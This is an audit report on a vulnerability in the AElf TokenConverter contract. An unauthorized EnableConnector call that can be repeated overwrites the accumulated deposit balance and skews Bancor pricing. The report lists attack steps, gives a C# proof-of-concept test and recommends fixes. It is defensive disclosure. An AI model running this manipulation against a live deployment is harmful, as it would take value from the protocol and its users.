# Audit Report

## Title
TokenConverter Deposit Balance Manipulation via EnableConnector Re-enabling Attack

## Summary
The `EnableConnector` function lacks authorization checks and protection against multiple invocations, allowing any user to overwrite accumulated deposit balances by manipulating resource token balances and re-calling the function. This breaks the Bancor reserve ratio integrity and enables token purchases at manipulated prices.

## Finding Description

The vulnerability stems from three critical design flaws in the TokenConverter contract's `EnableConnector` function:

**1. Asymmetric Balance Tracking**

The contract uses asymmetric balance tracking where resource token connectors read balances from the MultiToken contract, while deposit connectors read from internal `State.DepositBalance` accounting. [1](#0-0) 

**2. Missing Authorization and Re-enable Protection**

The `EnableConnector` function critically lacks any authorization check (no `AssertPerformedByConnectorController()` call) unlike other administrative functions. [2](#0-1) 

This contrasts with `UpdateConnector` which has both authorization and prevention of updates after activation. [3](#0-2) 

Test evidence confirms `EnableConnector` can be called directly without Parliament approval. [4](#0-3) 

**3. Overwrite Instead of Addition**

The critical flaw uses a SET operation that overwrites accumulated deposit balance. [5](#0-4) 

Compare this to legitimate `Buy` operations which correctly use addition. [6](#0-5) 

**4. Manipulable Balance Calculation**

The `GetNeededDeposit` function queries actual token balance from MultiToken, which can be inflated through direct transfers. [7](#0-6) 

**Attack Execution:**
1. Legitimate `Buy` operations accumulate significant deposit balance (e.g., 1,000,000 ELF)
2. Attacker directly transfers resource tokens to TokenConverter contract
3. Attacker calls `EnableConnector` (no authorization required)
4. `GetNeededDeposit` calculates lower deposit due to inflated balance
5. Line 297 overwrites accumulated balance with manipulated lower value
6. Bancor formula operates with imbalanced reserves
7. Subsequent buyers purchase tokens at artificially deflated prices

## Impact Explanation

**Financial Impact:** The attack directly compromises protocol financial integrity by manipulating the Bancor reserve ratio. When `State.DepositBalance` is artificially lowered while resource token balance remains high, the Bancor pricing formula produces incorrect prices, as it relies on these balances for calculations. [8](#0-7) 

**Quantified Loss:** If legitimate operations accumulated 1,000,000 ELF and an attacker donates sufficient resource tokens, the recalculated deposit could drop to near-zero. This creates massive price distortion, allowing token purchases at 90%+ discounts, directly extracting value from the protocol.

**Protocol Solvency:** All subsequent trading operates under distorted pricing until corrected, leading to systematic value extraction.

**Severity:** HIGH - Direct financial loss, protocol invariant violation (Bancor reserve integrity), affects all users.

## Likelihood Explanation

**Attacker Requirements:**
- Resource tokens for donation (publicly transferable)
- Ability to call `EnableConnector` (public, no authorization)
- Moderate capital for donation

**Attack Complexity:** LOW
- Two simple operations: token transfer + function call
- No timing constraints
- No privileged access required
- No complex state manipulation

**Economic Feasibility:** For high-value tokens with substantial deposits, profit from manipulated prices can exceed donation cost, making the attack economically rational.

**Detection Difficulty:** Operations appear legitimate until price manipulation manifests.

**Probability:** MEDIUM to HIGH - Technically trivial, publicly accessible, requires moderate capital.

## Recommendation

Add three critical protections to `EnableConnector`:

1. **Add authorization check:**
```csharp
public override Empty EnableConnector(ToBeConnectedTokenInfo input)
{
    AssertPerformedByConnectorController(); // Add this
    var fromConnector = State.Connectors[input.TokenSymbol];
    // ... rest of function
}
```

2. **Prevent re-enabling:**
```csharp
Assert(!fromConnector.IsPurchaseEnabled, "Connector already enabled");
Assert(!toConnector.IsPurchaseEnabled, "Connector already enabled");
```

3. **Use addition instead of overwrite:**
```csharp
State.DepositBalance[toConnector.Symbol] = 
    State.DepositBalance[toConnector.Symbol].Add(needDeposit.NeedAmount);
```

## Proof of Concept

```csharp
[Fact]
public async Task EnableConnector_Balance_Manipulation_Attack_Test()
{
    // Setup: Initialize and create connector
    await DefaultStub.Initialize.SendAsync(new InitializeInput { FeeRate = "0.005" });
    var tokenSymbol = "ATTACK";
    await CreateTokenAsync(tokenSymbol, 100_0000_0000);
    await AddPairConnectorAsync(tokenSymbol);
    
    // Issue tokens and enable connector legitimately
    await TokenContractStub.Issue.SendAsync(new IssueInput 
    { 
        Amount = 50_0000_0000, 
        To = DefaultSender, 
        Symbol = tokenSymbol 
    });
    
    var enableInfo = new ToBeConnectedTokenInfo 
    { 
        TokenSymbol = tokenSymbol, 
        AmountToTokenConvert = 50_0000_0000 
    };
    await DefaultStub.EnableConnector.SendAsync(enableInfo);
    
    // Perform legitimate Buy operations to accumulate deposit balance
    await TokenContractStub.Approve.SendAsync(new ApproveInput 
    { 
        Spender = TokenConverterContractAddress, 
        Symbol = "ELF", 
        Amount = 100_0000 
    });
    
    await DefaultStub.Buy.SendAsync(new BuyInput 
    { 
        Symbol = tokenSymbol, 
        Amount = 10_0000 
    });
    
    // Record accumulated deposit balance
    var depositBefore = (await DefaultStub.GetDepositConnectorBalance.CallAsync(
        new StringValue { Value = tokenSymbol })).Value;
    depositBefore.ShouldBeGreaterThan(0);
    
    // ATTACK: Donate resource tokens to manipulate balance
    await TokenContractStub.Transfer.SendAsync(new TransferInput 
    { 
        To = TokenConverterContractAddress, 
        Symbol = tokenSymbol, 
        Amount = 40_0000_0000 
    });
    
    // ATTACK: Re-call EnableConnector (no authorization, no re-enable check)
    var reEnableInfo = new ToBeConnectedTokenInfo 
    { 
        TokenSymbol = tokenSymbol, 
        AmountToTokenConvert = 0 
    };
    var result = await DefaultStub.EnableConnector.SendAsync(reEnableInfo);
    result.TransactionResult.Status.ShouldBe(TransactionResultStatus.Mined);
    
    // VERIFY: Deposit balance was overwritten to lower value
    var depositAfter = (await DefaultStub.GetDepositConnectorBalance.CallAsync(
        new StringValue { Value = tokenSymbol })).Value;
    
    // The attack succeeds: deposit balance is now lower despite legitimate accumulation
    depositAfter.ShouldBeLessThan(depositBefore);
}
```

This test demonstrates that `EnableConnector` can be called without authorization to overwrite accumulated deposit balances, breaking the Bancor reserve integrity.

### Citations

**File:** contract/AElf.Contracts.TokenConverter/TokenConverterContract.cs (L58-76)
```csharp
    public override Empty UpdateConnector(Connector input)
    {
        AssertPerformedByConnectorController();
        Assert(!string.IsNullOrEmpty(input.Symbol), "input symbol can not be empty'");
        var targetConnector = State.Connectors[input.Symbol];
        Assert(targetConnector != null, "Can not find target connector.");
        Assert(!targetConnector.IsPurchaseEnabled, "connector can not be updated because it has been activated");
        if (!string.IsNullOrEmpty(input.Weight))
        {
            var weight = AssertedDecimal(input.Weight);
            Assert(IsBetweenZeroAndOne(weight), "Connector Shares has to be a decimal between 0 and 1.");
            targetConnector.Weight = input.Weight.ToString(CultureInfo.InvariantCulture);
        }

        if (targetConnector.IsDepositAccount && input.VirtualBalance > 0)
            targetConnector.VirtualBalance = input.VirtualBalance;
        State.Connectors[input.Symbol] = targetConnector;
        return new Empty();
    }
```

**File:** contract/AElf.Contracts.TokenConverter/TokenConverterContract.cs (L120-123)
```csharp
        var amountToPay = BancorHelper.GetAmountToPayFromReturn(
            GetSelfBalance(fromConnector), GetWeight(fromConnector),
            GetSelfBalance(toConnector), GetWeight(toConnector),
            input.Amount);
```

**File:** contract/AElf.Contracts.TokenConverter/TokenConverterContract.cs (L141-141)
```csharp
        State.DepositBalance[fromConnector.Symbol] = State.DepositBalance[fromConnector.Symbol].Add(amountToPay);
```

**File:** contract/AElf.Contracts.TokenConverter/TokenConverterContract.cs (L269-301)
```csharp
    public override Empty EnableConnector(ToBeConnectedTokenInfo input)
    {
        var fromConnector = State.Connectors[input.TokenSymbol];
        Assert(fromConnector != null && !fromConnector.IsDepositAccount,
            "[EnableConnector]Can't find from connector.");
        var toConnector = State.Connectors[fromConnector.RelatedSymbol];
        Assert(toConnector != null, "[EnableConnector]Can't find to connector.");
        var needDeposit = GetNeededDeposit(input);
        if (needDeposit.NeedAmount > 0)
            State.TokenContract.TransferFrom.Send(
                new TransferFromInput
                {
                    Symbol = State.BaseTokenSymbol.Value,
                    From = Context.Sender,
                    To = Context.Self,
                    Amount = needDeposit.NeedAmount
                });

        if (input.AmountToTokenConvert > 0)
            State.TokenContract.TransferFrom.Send(
                new TransferFromInput
                {
                    Symbol = input.TokenSymbol,
                    From = Context.Sender,
                    To = Context.Self,
                    Amount = input.AmountToTokenConvert
                });

        State.DepositBalance[toConnector.Symbol] = needDeposit.NeedAmount;
        toConnector.IsPurchaseEnabled = true;
        fromConnector.IsPurchaseEnabled = true;
        return new Empty();
    }
```

**File:** contract/AElf.Contracts.TokenConverter/TokenConverterContract.cs (L374-390)
```csharp
    private long GetSelfBalance(Connector connector)
    {
        long realBalance;
        if (connector.IsDepositAccount)
            realBalance = State.DepositBalance[connector.Symbol];
        else
            realBalance = State.TokenContract.GetBalance.Call(
                new GetBalanceInput
                {
                    Owner = Context.Self,
                    Symbol = connector.Symbol
                }).Balance;

        if (connector.IsVirtualBalanceEnabled) return connector.VirtualBalance.Add(realBalance);

        return realBalance;
    }
```

**File:** test/AElf.Contracts.TokenConverter.Tests/TokenConvertConnectorTest.cs (L399-399)
```csharp
        await DefaultStub.EnableConnector.SendAsync(toBeBuildConnectorInfo);
```

**File:** contract/AElf.Contracts.TokenConverter/TokenConvert_Views.cs (L67-84)
```csharp
        var balance = State.TokenContract.GetBalance.Call(
            new GetBalanceInput
            {
                Owner = Context.Self,
                Symbol = input.TokenSymbol
            }).Balance;
        var amountOutOfTokenConvert = tokenInfo.TotalSupply - balance - input.AmountToTokenConvert;
        long needDeposit = 0;
        if (amountOutOfTokenConvert > 0)
        {
            var fb = fromConnector.VirtualBalance;
            var tb = toConnector.IsVirtualBalanceEnabled
                ? toConnector.VirtualBalance.Add(tokenInfo.TotalSupply)
                : tokenInfo.TotalSupply;
            needDeposit =
                BancorHelper.GetAmountToPayFromReturn(fb, GetWeight(fromConnector),
                    tb, GetWeight(toConnector), amountOutOfTokenConvert);
        }
```
